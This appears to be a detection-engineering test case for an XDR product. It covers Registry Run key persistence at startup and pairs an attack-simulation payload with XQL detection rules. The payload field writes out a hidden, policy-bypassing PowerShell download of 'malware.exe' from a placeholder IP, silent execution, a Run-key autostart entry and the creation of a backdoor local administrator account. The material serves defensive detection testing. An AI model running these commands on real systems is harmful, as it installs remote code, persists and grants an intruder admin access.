identity.name: Execution of Uncommon Process with User SID at Early Startup
identity.summary: An attacker executes a rare process using a local or domain user SID during system startup, potentially leveraging persistence mechanisms. Cortex should detect this anomalous behavior based on process
identity.description: An attacker executes a rare process using a local or domain user SID during system startup, potentially leveraging persistence mechanisms. Cortex should detect this anomalous behavior based on process execution patterns and user context.

techniques.name: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

payload.code:
powershell.exe -NoP -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri 'http://192.0.2.10/malware.exe' -OutFile 'C:\\Windows\\Temp\\malware.exe'"
start-process -FilePath "C:\\Windows\\Temp\\malware.exe" -ArgumentList '/s /v /q'
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Updater" /t REG_SZ /d "C:\\Windows\\Temp\\malware.exe" /f
net user attacker P@ssw0rd /add
net localgroup administrators attacker /add

expected_artifacts.description: Execution of PowerShell with hidden flag and bypass execution policy
Downloaded malware file in Temp directory

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Uncommon Process with Local/User SID at Startup
biocs.description: Detection of an uncommon process being executed with a local or domain user SID during early startup stages
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'cmd.exe'
| filter action_process_image_name in ('powershell.exe', 'reg.exe', 'net.exe')
| filter causality_actor_process_image_name = 'services.exe' or causality_actor_process_image_name = 'svchost.exe'
| filter not action_file_path contains 'system32' or action_file_path contains 'Temp'

abiocs.name: Early Startup Execution with User Context
abiocs.description: Behavioral deviation indicating execution of uncommon process with user SID at early startup stage
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'cmd.exe'
